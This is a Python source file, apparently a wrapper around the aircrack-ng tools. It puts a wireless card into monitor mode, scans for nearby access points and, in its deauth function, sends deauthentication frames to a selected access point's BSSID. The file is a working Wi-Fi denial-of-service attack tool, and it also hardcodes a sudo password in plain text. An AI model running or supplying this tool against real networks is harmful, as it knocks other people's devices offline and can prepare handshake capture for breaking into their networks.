import asyncio
from contextlib import suppress

from rich.console import Console
from rich.prompt import Prompt

from src.models import Startup, User, AirmonNg, AirodumpNg, AireplayNg, MONITOR
from src.models.bluetooth import HciConfig

CONSOLE = Console()
CONSOLE.clear()
CONSOLE.show_cursor(False)


async def monitor_interface(secret):
    airmon = AirmonNg(secret)
    interfaces = await airmon.interfaces
    iface_ = Prompt.ask('Select an interface', choices=[str(a) for a in interfaces])
    CONSOLE.print(f'Selected Interface {iface_}')
    return airmon, iface_


async def scan_for_targets(secret):
    """Scan for targets, return json."""
    airmon, interface = await monitor_interface(secret)
    # client = None
    ap_ = None

    async with airmon(interface) as mon:
        async with AirodumpNg(secret) as pdump:
            async for aps in pdump(mon.monitor_interface):
                CONSOLE.clear()
                CONSOLE.print(aps.table)
                client = Prompt.ask(
                    'Select an AP',
                    choices=['continue', *[str(a) for a in range(len(aps))]])
                if client != 'continue':
                    ap_ = aps[int(client)]
                    break

        if not ap_:
            return

        async with AirodumpNg(secret) as pdump:
            CONSOLE.print(
                ":vampire:",
                f"Selected client: [red] {ap_.bssid} [/red]")

            async for result in pdump(mon.monitor_interface, **ap_.airodump):
                CONSOLE.clear()
                CONSOLE.print(result.table)
                await asyncio.sleep(3)


async def deauth(secret):
    """Scan for targets, return json."""
    # Select first available interface matching wlp0*
    airmon, interface = await monitor_interface(secret)
    print(interface)
    interface_ = await airmon.select_interface('wlp0.*')
    ap_ = None

    CONSOLE.print(f'Selected Interface {interface_}')

    async with airmon(interface_) as mon:
        await asyncio.sleep(2)
        async with AirodumpNg(secret) as pdump:
            async for aps in pdump(mon.monitor_interface):
                CONSOLE.clear()
                CONSOLE.print(aps.table)
                # For this example, force the first result
                with suppress(KeyError):
                    client = Prompt.ask(
                        'Select an AP',
                        choices=['continue', *[str(a) for a in range(len(aps))]])
                    if client != 'continue':
                        ap_ = aps[int(client)]
                        break
                    # ap_ = result[0]
                    CONSOLE.print(f'Selected AP {ap_.bssid}')
                    break
                await asyncio.sleep(3)

    if not ap_:
        # We didn't manage to getan AP, and somehow the process died.
        CONSOLE.print("No APs available")
        return

    # Change channel with airmon-ng
    async with airmon(interface_, ap_.channel) as mon:
        async with AireplayNg(secret) as aireplay:
            async for res in aireplay(mon.monitor_interface, deauth=10, D=True, b=ap_.bssid):
                CONSOLE.print(res.table)
                await asyncio.sleep(3)


async def main():
    if __name__ == '__main__':
        Startup()
        user = User('Af4Tf2Dp!')
        with user.secret() as sec:
            await scan_for_targets(sec)


asyncio.run(main())

# with secret() as s:
#     result = run('sudo -S airmon-ng check kill'.split(), stdin=s, stderr=DEVNULL)
#     print('Killing network processes, and enabling monitoring mode')
#     iw = iw.split(b'\n') \
#         if (iw := check_output('iw dev'.split(), stdin=s, stderr=DEVNULL)) else []
#     iface = [i for i in iw if b'Interface' in i][0].decode()[11:]
#     mode = [i for i in iw if b'type' in i][0].decode()[7:]
#     print(iface, mode)
#     if iface == 'wlan0':
#         if mode == 'monitor':
#             run('sudo -S ip link set wlan0 down'.split(), stdin=s, stderr=DEVNULL)
#             run('sudo -S iw wlan0 set type managed'.split(), stdin=s, stderr=DEVNULL)
#         out = check_output('sudo -S airmon-ng start wlan0'.split(), stdin=s, stderr=DEVNULL)
#         print(out)
#     elif iface == 'wlan0mon' and mode != 'monitor':
#         out = check_output('sudo -S airmon-ng start wlan0'.split(), stdin=s, stderr=DEVNULL)
#         print(out)
